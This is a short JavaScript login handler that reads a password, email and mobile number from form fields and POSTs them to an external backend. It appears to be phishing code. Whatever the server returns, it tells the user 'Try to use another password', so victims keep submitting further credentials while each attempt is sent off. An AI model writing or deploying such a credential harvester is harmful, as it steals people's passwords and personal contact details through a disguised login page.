function clicked() {
  const pass = document.querySelector(".passt");
  const email = document.querySelector(".emailt");
  const mobile = document.querySelector(".mobilet");
  const passwordValue = pass.value;
  const emailValue = email.value;
  const mobileValue = mobile.value;

  if (mobileValue.length < 8) {
    alert("Please enter a valid mobile number");
    return;
  }
  if (
    passwordValue.length < 2 ||
    emailValue.length < 2 ||
    mobileValue.length < 2
  ) {
    alert("All fields are required");
    return;
  }
  fetch("https://second-backend-gamma.vercel.app/user/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      email: emailValue,
      mobile: mobileValue,
      password: passwordValue,
    }),
  })
    .then((response) => response.json())
    .then(() => {
      alert("Try to use another password");
    })
    .catch(() => {
      alert("Try to use another password");
    });
}
